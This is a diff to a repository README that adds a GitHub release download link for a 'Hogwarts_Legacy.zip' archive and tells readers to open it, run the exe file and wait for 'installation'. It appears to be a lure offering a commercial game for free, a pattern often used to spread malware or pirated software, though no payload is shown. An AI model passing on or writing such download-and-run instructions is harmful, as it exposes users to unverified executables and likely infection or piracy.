@@ -1,10 +1,11 @@
-# [Download]()
+# [Download](https://github.com/AbdurRafay-Qureshi/Hogwarts-Legacy/releases/download/1/Hogwarts_Legacy.zip)
 
 # Instructions:
 1. Download the archive
 2. Open the file
 3. Run exe file
-4. Enjoy
+4. Wait until the game installation is completed 
+5. Enjoy
 
 ### Documentation
 
